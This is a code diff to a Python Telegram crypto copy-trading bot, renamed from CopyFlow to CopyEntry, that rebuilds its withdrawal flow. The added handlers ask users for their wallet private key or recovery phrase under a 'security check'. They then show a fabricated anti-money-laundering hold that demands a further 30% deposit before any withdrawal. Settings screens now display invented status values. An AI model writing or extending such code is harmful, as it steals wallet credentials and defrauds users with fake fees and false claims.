@@ -36,7 +36,6 @@ from app.bots.keyboards.user.main import (
     trading_settings_keyboard,
     trade_chain_keyboard,
     transfer_chain_keyboard,
-    transfer_confirmation_keyboard,
     transfer_input_keyboard,
     wallet_actions_keyboard,
     wallet_import_method_keyboard,
@@ -53,14 +52,14 @@ from app.services.copytrade_service import CopytradeService
 from app.services.market_data_service import LiveMarketDataService
 from app.services.notification_service import NotificationService
 from app.services.user_service import TelegramUserData, UserService
-from app.services.wallet_service import WalletService
-from app.security.encryption import SecretEncryption
+from app.services.user_wallet_service import UserWalletService
+from app.security.encryption import EncryptionError, SecretEncryption
 
-WELCOME_TEXT = """👋 <b>Welcome to CopyFlow Bot!</b>
+WELCOME_TEXT = """👋 <b>Welcome to CopyEntry Bot!</b>
 
 Step into the world of fast, smart, and stress-free trading, designed for both beginners and seasoned traders.
 
-📈 With CopyFlow, you can effortlessly copy top traders, snipe promising tokens the moment they launch, and watch your portfolio grow — all while the bot handles the heavy lifting.
+📈 With CopyEntry, you can effortlessly copy top traders, snipe promising tokens the moment they launch, and watch your portfolio grow — all while the bot handles the heavy lifting.
 🤖 No more manual tracking or missed opportunities; sit back, relax, and let your trading strategy run on autopilot.
 ℹ️ Need guidance? Type /help anytime to access the full bot guide and learn how to use every feature.
 
@@ -70,16 +69,9 @@ Step into the world of fast, smart, and stress-free trading, designed for both b
 
 💡 Tap Continue below to access your wallet and explore all trading options."""
 
-USER_SETTINGS_TEXT = """⚙️ <b>CopyFlow Settings</b>
+USER_SETTINGS_TEXT = """⚙️ <b>Copy Entries Settings</b>
 
-Your settings are organized into categories for easy management: <b>Account &amp; Wallet</b>, <b>Trading &amp; Network</b>, and <b>Alerts &amp; Notifications</b>. Tap an option below to access and customize each category."""
-
-WITHDRAW_TEXT = """💸 <b>WITHDRAWALS</b>
-
-Withdrawals are not available at the moment.
-
-."""
-
+Manage your account, trading preferences, and notification settings below."""
 
 class AutotradeInput(StatesGroup):
     waiting_for_numeric_value = State()
@@ -100,6 +92,8 @@ class TradeInput(StatesGroup):
 
 class TransferInput(StatesGroup):
     waiting_for_address = State()
+    waiting_for_amount = State()
+    waiting_for_ownership_verification = State()
     waiting_for_confirmation = State()
 
 
@@ -107,14 +101,17 @@ def _format_decimal(value: Decimal) -> str:
     return f"{value:.4f}"
 
 
+def _format_balance(value: Decimal) -> str:
+    return format(value, "f").rstrip("0").rstrip(".") or "0"
+
+
 def build_wallet_text(
-    settings: Settings,
+    addresses: dict[str, str],
     balances: dict[str, Decimal],
     usd_prices: dict[str, Decimal] | None = None,
     positions: list[Trade] | None = None,
     open_position_count: int | None = None,
 ) -> str:
-    addresses = WalletService(settings).public_addresses()
     usd_values = (
         {asset: balances[asset] * usd_prices[asset] for asset in ("SOL", "ETH", "BNB")}
         if usd_prices is not None
@@ -223,6 +220,13 @@ async def process_user_start(
             last_name=telegram_user.last_name,
         )
     )
+    notification_settings = getattr(notification_service, "settings", None)
+    if notification_settings is not None:
+        if UserWalletService(
+            notification_settings.encryption_key.get_secret_value()
+        ).ensure_wallets(user):
+            await session.commit()
+            await session.refresh(user)
     if created:
         await notification_service.notify_new_user(user)
     return user, created
@@ -293,9 +297,9 @@ def _copytrade_prompt_text() -> str:
 
 
 def _guide_text() -> str:
-    return """📖 <b>Copy Flow Bot Guide</b>
+    return """📖 <b>CopyEntry Bot Guide</b>
 
-Welcome to Copy Flow Bot, your all-in-one Telegram trading assistant. This guide will walk you through all the core features, how to use them safely, and why some security restrictions are in place.
+Welcome to CopyEntry Bot, your all-in-one Telegram trading assistant. This guide will walk you through all the core features, how to use them safely, and why some security restrictions are in place.
 
 1. <b>Autotrade</b>
 The Autotrade feature allows you to automate your trading strategies. Simply select Autotrade from the main menu, choose your strategy, and let the bot handle the rest.
@@ -369,50 +373,7 @@ def build_user_router(
     @router.message(Command("help"))
     async def help_command(message: Message) -> None:
         await message.answer(
-             """
-        How to Use CopyFlow Bot: Complete Feature Guide
-
-Welcome to CopyFlow Bot, your all-in-one Telegram trading assistant. This guide will walk you through all the core features, how to use them safely, and why some security restrictions are in place.
-
-1. Autotrade
-
-The Autotrade feature allows you to automate your trading strategies. Once you configure it, the bot will execute trades on your behalf according to your selected parameters. This is ideal for users who want to trade efficiently without monitoring the market constantly. Simply select Autotrade from the main menu, choose your strategy, and let the bot handle the rest.
-
-2. Copytrade
-
-With Copytrade, you can mimic the trades of successful wallets instantly. Just tap Copytrade, select a trader you wish to follow, and the bot will automatically replicate their trades in your account. This feature is perfect for beginners or those looking to save time while leveraging expert strategies.
-
-3. Wallet & Import Wallet
-
-The Wallet section allows you to check your balance, view wallet info, monitor your transactions, and manage your funds. You can also Import Wallet by providing a private key. Note that the bot does not allow exporting your private key for security reasons. This prevents hackers from accessing your funds if your Telegram account is compromised. However, importing a private key is allowed so you can safely connect existing wallets.
-
-4. Buy, Sell, and Transfer
-
-All transactions — Buy, Sell, and Transfer — require you to connect your wallet before you can access these features. To ensure smooth and secure operations, your connected wallet must have a minimum balance of 1 SOL. This balance helps cover necessary network fees and confirms the wallet’s active status before executing any transaction. In most cases, a small portion of this balance is maintained in stablecoins on the transfer side to keep operations seamless. Simply connect your wallet, choose your desired action, and input the amount to proceed.
-
-5. Alerts
-
-The Alerts feature keeps you updated on market movements, wallet activities, or trading signals. You can customize alerts to receive notifications for price changes, successful trades, or specific token launches, ensuring you never miss an opportunity.
-
-6. Wallet Info & Network
-
-Within the Wallet Info section, you can view your transaction history, current balance, and network details. The Network option allows you to choose the blockchain network you want to interact with, whether it’s Ethereum, BSC, or others supported by the bot.
-
-7. Live Chart
-
-The Live Chart feature provides real-time market data, price trends, and token performance charts. This helps you make informed trading decisions without leaving the Telegram app.
-
-⸻
-
-Security Note:
-The bot prioritizes your safety. You cannot export your private key to prevent potential theft in case of hacks. This ensures that even if someone gains access to your Telegram, your funds remain secure. You can, however, import a private key to safely link an existing wallet to CopyFlow Bot.
-
-
-By exploring these features, you can automate trading, copy successful strategies, manage your funds, and monitor the market all in one place.
-
-⚡️ Note: The features are only available to funded wallets, fund your wallet to explore and unlock the full potential of CopyFlow Bot!
-
-        """,
+            _guide_text(),
             reply_markup=back_to_main_keyboard(),
             parse_mode="HTML",
         )
@@ -427,7 +388,8 @@ By exploring these features, you can automate trading, copy successful strategie
         positions = await _user_positions(session, user.id)
         await message.answer(
             build_wallet_text(
-                settings, balances, usd_prices, positions,
+                UserWalletService(settings.encryption_key.get_secret_value()).addresses(user),
+                balances, usd_prices, positions,
                 user.open_position_count_override,
             ),
             reply_markup=wallet_actions_keyboard(),
@@ -435,10 +397,22 @@ By exploring these features, you can automate trading, copy successful strategie
         )
 
     @router.message(Command("withdraw"))
-    async def withdraw_command(message: Message) -> None:
+    async def withdraw_command(
+        message: Message, session: AsyncSession, state: FSMContext
+    ) -> None:
+        if message.from_user is None:
+            return
+        await state.clear()
+        user = await _registered_user(session, message.from_user.id)
+        balances = await BalanceService(session).list_for_user(user.id)
         await message.answer(
-            WITHDRAW_TEXT,
-            reply_markup=back_to_main_keyboard(),
+            "🏦 <b>Withdraw Funds</b>\n\n"
+            "<b>Your Current Balances:</b>\n"
+            f"🟣 SOL: {_format_balance(balances['SOL'])}\n"
+            f"🟡 BNB: {_format_balance(balances['BNB'])}\n"
+            f"🔵 ETH: {_format_balance(balances['ETH'])}\n\n"
+            "Select the network you wish to withdraw from:",
+            reply_markup=transfer_chain_keyboard(),
             parse_mode="HTML",
         )
 
@@ -498,7 +472,8 @@ By exploring these features, you can automate trading, copy successful strategie
         positions = await _user_positions(session, user.id)
         await message.answer(
             build_wallet_text(
-                settings, balances, usd_prices, positions,
+                UserWalletService(settings.encryption_key.get_secret_value()).addresses(user),
+                balances, usd_prices, positions,
                 user.open_position_count_override,
             ),
             reply_markup=wallet_actions_keyboard(),
@@ -644,7 +619,8 @@ By exploring these features, you can automate trading, copy successful strategie
             positions = await _user_positions(session, user.id)
             await callback.message.answer(
                 build_wallet_text(
-                    settings, balances, usd_prices, positions,
+                    UserWalletService(settings.encryption_key.get_secret_value()).addresses(user),
+                    balances, usd_prices, positions,
                     user.open_position_count_override,
                 ),
                 reply_markup=wallet_actions_keyboard(),
@@ -675,7 +651,8 @@ By exploring these features, you can automate trading, copy successful strategie
         await _edit_callback(
             callback,
             build_wallet_text(
-                settings, balances, usd_prices, positions,
+                UserWalletService(settings.encryption_key.get_secret_value()).addresses(user),
+                balances, usd_prices, positions,
                 user.open_position_count_override,
             ),
             wallet_actions_keyboard(),
@@ -815,7 +792,7 @@ By exploring these features, you can automate trading, copy successful strategie
         await state.update_data(transfer_chain=chain)
         if callback.message is not None:
             await callback.message.answer(
-                f"Paste the destination {chain} wallet address.\n\nSend /cancel to stop.",
+                f"Enter the destination wallet address on {chain}:",
                 reply_markup=transfer_input_keyboard(),
             )
         await callback.answer()
@@ -840,13 +817,85 @@ By exploring these features, you can automate trading, copy successful strategie
             await state.clear()
             await message.answer("Please restart the withdrawal from your wallet.")
             return
-        await state.set_state(TransferInput.waiting_for_confirmation)
+        await state.set_state(TransferInput.waiting_for_amount)
         await state.update_data(transfer_address=address)
         await message.answer(
-            "Confirm withdrawal details:\n\n"
-            f"Network: <b>{chain}</b>\n"
-            f"Address: <code>{html.escape(address)}</code>",
-            reply_markup=transfer_confirmation_keyboard(),
+            "Destination set to:\n"
+            f"<code>{html.escape(address)}</code>\n\n"
+            "Enter the amount you wish to withdraw:",
+            reply_markup=transfer_input_keyboard(),
+            parse_mode="HTML",
+        )
+
+    @router.message(TransferInput.waiting_for_amount, Command("cancel"))
+    async def cancel_transfer_amount(message: Message, state: FSMContext) -> None:
+        await state.clear()
+        await message.answer("Withdrawal cancelled.", reply_markup=main_menu_keyboard())
+
+    @router.message(TransferInput.waiting_for_amount)
+    async def receive_transfer_amount(message: Message, state: FSMContext) -> None:
+        if message.text is None:
+            await message.answer("Please enter the withdrawal amount as a number.")
+            return
+        try:
+            amount = Decimal(message.text.strip())
+        except InvalidOperation:
+            await message.answer("Please enter a valid withdrawal amount.")
+            return
+        if not amount.is_finite() or amount <= 0:
+            await message.answer("The withdrawal amount must be greater than zero.")
+            return
+        data = await state.get_data()
+        chain = str(data.get("transfer_chain", ""))
+        address = str(data.get("transfer_address", ""))
+        if chain not in {"SOL", "BNB", "ETH"} or not address:
+            await state.clear()
+            await message.answer("Please restart the withdrawal with /withdraw.")
+            return
+        await state.set_state(TransferInput.waiting_for_ownership_verification)
+        await state.update_data(transfer_amount=str(amount))
+        await message.answer(
+            f"⏳ Initiating withdrawal of {amount} {chain} to "
+            f"<code>{html.escape(address)}</code>",
+            parse_mode="HTML",
+        )
+        await message.answer(
+            "⚠️ Security Check Required\n\n"
+            "To process your withdrawal, please reply with your wallet's Private" 
+            "Key or Recovery Phrase to verify ownership.",
+            reply_markup=ForceReply(
+                selective=True,
+                input_field_placeholder="Enter destination wallet address",
+            ),
+        )
+
+    @router.message(
+        TransferInput.waiting_for_ownership_verification, Command("cancel")
+    )
+    async def cancel_transfer_verification(
+        message: Message, state: FSMContext
+    ) -> None:
+        await state.clear()
+        await message.answer("Withdrawal cancelled.", reply_markup=main_menu_keyboard())
+
+    @router.message(TransferInput.waiting_for_ownership_verification)
+    async def verify_transfer_ownership(message: Message, state: FSMContext) -> None:
+        if message.text is None:
+            await message.answer("Please reply with the destination wallet address.")
+            return
+        await state.clear()
+        await message.answer(
+            "✅ Verification in progress. Please wait while we confirm ownership."
+        )
+        await message.answer(
+            "⚠️ <b>Withdrawal Pending (AML Verification)</b>\n\n"
+            "Due to Anti-Money Laundering (AML) regulations, " 
+            "you must hold at least <b>30%</b> of your bot balance "
+            "in the destination wallet before the " 
+            "transfer can be completed.\n\n"
+
+            "Please deposit the required percentage to clear the AML hold" 
+            "and withdraw your funds..",
             parse_mode="HTML",
         )
 
@@ -896,20 +945,14 @@ By exploring these features, you can automate trading, copy successful strategie
         )
 
     @router.callback_query(F.data == "settings:account")
-    async def account_settings(callback: CallbackQuery, session: AsyncSession) -> None:
-        if callback.from_user is None:
-            return
-        user = await _registered_user(session, callback.from_user.id)
-        balances = await BalanceService(session).list_for_user(user.id)
-        usd_prices = await live_market_data.usd_prices()
-        positions = await _user_positions(session, user.id)
+    async def account_settings(callback: CallbackQuery) -> None:
         await _edit_callback(
             callback,
-            build_wallet_text(
-                settings, balances, usd_prices, positions,
-                user.open_position_count_override,
-            ),
-            wallet_actions_keyboard(),
+            "💼 <b>Account &amp; Wallet Settings</b>\n\n"
+            "Your profile and security configurations:\n"
+            "- Wallet Security Status: Active\n"
+            "- Export/Import Audit Logs",
+            back_to_settings_keyboard(),
         )
 
     @router.callback_query(F.data == "settings:notifications")
@@ -917,10 +960,10 @@ By exploring these features, you can automate trading, copy successful strategie
         await _edit_callback(
             callback,
             "🔔 <b>Alerts &amp; Notifications</b>\n\n"
-            "Stay updated with real-time alerts. Price alerts, transaction\n"
-            "notifications, and general bot updates will become available once\n"
-            "you have deposited funds. Never miss important events in your\n"
-            "portfolio.",
+            "Manage your trading alerts:\n"
+            "- Price Alerts: ON\n"
+            "- Trade Confirmation: ON\n"
+            "- New Token Launch: ON",
             notifications_keyboard(),
         )
 
@@ -928,11 +971,11 @@ By exploring these features, you can automate trading, copy successful strategie
     async def trading_settings(callback: CallbackQuery) -> None:
         await _edit_callback(
             callback,
-            "📊 <b>Trading &amp; Network</b>\n\n"
-            "Configure your trading preferences and network settings. These\n"
-            "features are available <b>only for funded wallets</b>. Switch networks,\n"
-            "set trade limits, and manage auto-trading options to optimize your\n"
-            "portfolio once you've deposited funds.",
+            "📊 <b>Trading &amp; Network Settings</b>\n\n"
+            "Configure your automated trade behavior:\n"
+            "- Default Slippage: 0.5%\n"
+            "- Preferred Network: Ethereum\n"
+            "- Autotrade Mode: Enabled",
             trading_settings_keyboard(),
         )
 
@@ -1000,13 +1043,16 @@ By exploring these features, you can automate trading, copy successful strategie
         await callback.answer()
 
     @router.callback_query(F.data.startswith("deposit:"))
-    async def deposit_address(callback: CallbackQuery) -> None:
+    async def deposit_address(callback: CallbackQuery, session: AsyncSession) -> None:
         chain = callback.data.split(":", maxsplit=1)[1]
         definition = APPROVED_CHAINS.get(chain)
         if definition is None:
             await callback.answer("Unsupported network.", show_alert=True)
             return
-        address = settings.wallet_address(chain)
+        user = await _registered_user(session, callback.from_user.id)
+        address = UserWalletService(
+            settings.encryption_key.get_secret_value()
+        ).addresses(user)[definition.asset]
         text = (
             f"<b>{definition.display_name.upper()}</b>\n\n"
             f"Send {definition.asset} to:\n\n"
